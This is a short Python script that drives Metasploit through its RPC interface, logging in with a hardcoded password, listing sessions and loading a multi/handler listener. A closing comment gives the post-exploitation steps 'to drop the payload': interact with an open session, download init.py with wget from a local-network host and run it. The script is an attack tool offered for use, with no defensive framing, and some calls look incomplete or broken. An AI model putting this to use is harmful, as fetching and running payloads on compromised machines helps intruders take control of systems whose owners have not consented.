import pprint, time

pp = pprint.PrettyPrinter(indent=4)

def drop_payload(password):
	msf = exploit.Msfrpc({})
	msf.auth = msf.call('auth.login',['msf',password])
	msf.token = msf.auth['token']
	msf.console_id = msf.call('console.create')['id']
	time.sleep(3)
	pp.pprint(msf.call('console.read',[]))
	pp.pprint(msf.call('console.write',['sessions -i\n']))
	pp.pprint(msf.call('console.write',['use multi/handler\n']))
	time.sleep(1)
	pp.pprint(msf.call('console.read',[]))
	pp.pprint(msf.call('console.destroy',[]))

'''
	while True:
		try:
			inp = input().split(' ')
			if len(inp):
				method = inp[0]
				if len(inp) > 1:
					args = ' '.join(inp[1::]) + '\n'
					print(args)
					print(msf.call(method,[args]))
				else:
					print(msf.call(inp[0],[]))
				time.sleep(3)
				print(msf.call('console.read',[]))
		except KeyboardInterrupt as e:
			print(e)
			break
'''

if __name__ == '__main__':
	password = 'ez.exe'
	drop_payload(password)

'''
general commands for msfconsole after a session is opened to drop the payload
sessions -i
sessions 1
wget 192.168.171.1/payloads/init.py
python init.py
^C
'''